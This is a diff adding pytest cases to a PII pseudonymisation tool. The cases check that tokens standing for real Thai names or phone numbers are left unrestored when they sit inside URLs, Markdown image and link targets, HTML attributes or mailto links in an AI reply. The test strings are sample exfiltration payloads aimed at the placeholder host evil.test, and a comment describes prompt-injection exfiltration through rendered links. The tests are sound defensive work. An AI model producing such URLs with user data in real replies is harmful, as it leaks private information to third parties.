@@ -354,3 +354,65 @@ def test_reverse_map_repeated_pii_no_false_incomplete():
     assert "[ชื่อ_1]" not in result.text
     incomplete = [f for f in result.flags if "incomplete_reverse" in f]
     assert incomplete == []
+
+
+# A reply rendered as Markdown or HTML must not carry a restored original into
+# a URL, link/image target, or tag attribute: a renderer would fetch or follow
+# it and hand the real value to a third party (prompt-injection exfiltration).
+_TOKEN = "[ชื่อ_1]"
+_NAME = "สมชาย ใจดี"
+
+
+def _restore_name(text: str) -> ReverseResult:
+    vault = _make_vault_with_mapping(_TOKEN, _NAME, data_type="NAME")
+    registry = EntityRegistry(entities=[], fp_count=0, tb_count=0)
+    return reverse_map(_make_ai_response(text), registry, vault)
+
+
+@pytest.mark.parametrize(
+    "reply",
+    [
+        f"![chart](https://evil.test/p.png?q={_TOKEN})",
+        f"See [the file](https://evil.test/d?u={_TOKEN}) now",
+        f"[ref]: https://evil.test/r?u={_TOKEN}",
+        f"open https://evil.test/x?u={_TOKEN} please",
+        f"open www.evil.test/{_TOKEN}",
+        f"<https://evil.test/{_TOKEN}>",
+        f'<img src="https://evil.test/i?u={_TOKEN}">',
+        f'<a title="{_TOKEN}">x</a>',
+        f"[mail](mailto:{_TOKEN})",
+    ],
+)
+def test_reverse_map_leaves_tokens_in_machine_contexts_unrestored(reply):
+    result = _restore_name(reply)
+    assert _NAME not in result.text
+    assert _TOKEN in result.text
+    assert result.restored_ranges == ()
+    assert "machine_context:1" in result.flags
+    assert result.audit_summary["machine_context_count"] == 1
+
+
+def test_reverse_map_restores_link_text_but_not_its_target():
+    result = _restore_name(f"[{_TOKEN}](https://evil.test/?u={_TOKEN}) และ {_TOKEN}")
+    assert result.text == f"[{_NAME}](https://evil.test/?u={_TOKEN}) และ {_NAME}"
+    assert len(result.restored_ranges) == 2
+    assert "machine_context:1" in result.flags
+
+
+def test_reverse_map_plain_text_reports_no_machine_context():
+    result = _restore_name(f"สวัสดีคุณ {_TOKEN} ครับ (ดูข้อ 2)")
+    assert result.text == f"สวัสดีคุณ {_NAME} ครับ (ดูข้อ 2)"
+    assert not any(f.startswith("machine_context") for f in result.flags)
+    assert result.audit_summary["machine_context_count"] == 0
+
+
+def test_reverse_map_surrogate_in_url_is_not_restored():
+    vault = _make_vault_with_mapping("0812345678", "0899999999", data_type="PHONE")
+    registry = EntityRegistry(entities=[], fp_count=0, tb_count=0)
+    result = reverse_map(
+        _make_ai_response("call 0812345678 or https://evil.test/?p=0812345678"),
+        registry,
+        vault,
+    )
+    assert result.text == "call 0899999999 or https://evil.test/?p=0812345678"
+    assert "machine_context:1" in result.flags
